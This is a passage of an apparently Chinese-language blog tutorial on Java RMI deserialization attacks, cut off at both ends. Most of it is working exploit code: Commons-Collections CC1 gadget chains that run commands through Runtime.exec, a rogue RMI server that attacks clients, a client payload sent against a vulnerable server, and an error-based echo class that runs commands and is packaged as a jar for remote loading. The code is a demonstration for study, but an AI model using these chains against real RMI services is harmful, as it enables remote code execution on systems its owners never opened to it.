class="hljs-string">&#x27;calc&#x27;</span><br></code></pre></td></tr></table></figure><p>在客户端运行此代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        registry.list();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/RMI/r81.png"></p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p>服务端攻击客户端，大抵可以分为以下两种情景</p><ol><li>服务端返回Object对象</li><li>远程加载对象</li></ol><h4 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a>服务端返回Object对象</h4><p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：</p><ul><li>User接口，返回的是Object对象</li></ul><p>这个接口需要在服务端和客户端都创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.rmi.Remote &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>服务端实现 User 接口，返回 CC1 的恶意 Object 对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerReturnObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>  &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerReturnObject</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">return</span> (Object) handler;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>服务端将恶意对象绑定到注册中心</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;  <br><span class="hljs-keyword">import</span> java.rmi.RemoteException;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassServer</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;  <br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);  <br> <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);  <br> registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);  <br>  <br> System.out.println(<span class="hljs-string">&quot;registry is running...&quot;</span>);  <br>  <br> System.out.println(<span class="hljs-string">&quot;liming is bind in registry&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>客户端获取对象并调用 <code>getUser()</code> 方法，将反序列化服务端传来的恶意远程对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;  <br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.RemoteException;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br>  <br><span class="hljs-comment">// 服务端打客户端，返回 Object 对象  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br> <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)registry.lookup(<span class="hljs-string">&quot;user&quot;</span>);  <br> user.getUser();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>运行一下</p><p>顺利弹出计算器</p><p><img src="/img/RMI/r82.png"></p><h4 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h4><p>适用性很低，这里贴出来做一个记录吧，说不定能用上呢</p><p>当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>**java.rmi.server.codebase：**codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用<code>http://</code>、<code>ftp://</code>、file:&#x2F;&#x2F;进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些<strong>子类</strong>中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的<strong>子类</strong>，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p><ol><li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置<code>java.security.policy</code>，这在后面的利用中可以看到。</li><li>属性 <code>java.rmi.server.useCodebaseOnly</code> 的值必需为false。但是从JDK 6u45、7u21开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的<code>java.rmi.server.codebase</code> 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li></ol><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端打服务端"><a href="#客户端打服务端" class="headerlink" title="客户端打服务端"></a>客户端打服务端</h3><p>服务端代码</p><ul><li>jdk版本1.7</li><li>使用具有漏洞的Commons-Collections3.1组件</li><li>RMI提供的数据有Object类型（因为攻击payload就是Object类型）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;  <br><span class="hljs-keyword">import</span> java.rmi.RemoteException;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VictimServer</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteObj</span> &#123;  <br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>            <span class="hljs-built_in">super</span>();  <br> &#125;  <br>  <br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>            System.out.println(<span class="hljs-string">&quot;调用了hello方法&quot;</span>);  <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span>;  <br> &#125;  <br>  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">evil</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>            System.out.println(<span class="hljs-string">&quot;调用了evil方法，传递对象为：&quot;</span>+obj);  <br> &#125;  <br>  <br>        <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br> &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();  <br> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);  <br> Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">VictimServer</span>().start();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> Server.IRemoteHelloWorld;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br> <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> Server.IRemoteHelloWorld;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);<br>        r.evil(getpayload());<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getpayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br> <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lala&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, transformerChain);<br> <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">ctor</span> <span class="hljs-operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> ctor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="远程加载服务对象"><a href="#远程加载服务对象" class="headerlink" title="远程加载服务对象"></a>远程加载服务对象</h3><p>和上边Server打Client一样利用条件非常苛刻。</p><p>参考：<a href="https://paper.seebug.org/1091/#serverrmi">https://paper.seebug.org/1091/#serverrmi</a></p><h1 id="RMI的进阶攻击方式"><a href="#RMI的进阶攻击方式" class="headerlink" title="RMI的进阶攻击方式"></a>RMI的进阶攻击方式</h1><h2 id="利用URLClassLoader实现回显攻击"><a href="#利用URLClassLoader实现回显攻击" class="headerlink" title="利用URLClassLoader实现回显攻击"></a>利用URLClassLoader实现回显攻击</h2><p>攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端</p><p>远程demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBaseExec</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">do_exec</span><span class="hljs-params">(String args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">proc</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(args);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(proc.getInputStream()));<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>)<br>        &#123;<br>            sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> sb.toString();<br>        Exception e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(result);<br>        <span class="hljs-keyword">throw</span> e;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过如下命令制作成jar包：</p><p>这个jar包要放在远程的服务器上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">javac ErrorBaseExec.java<br>jar -cvf RMIexploit.jar ErrorBaseExec.class<br></code></pre></td></tr></table></figure><p>客户端POC</p><p>还是利用CC1链触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 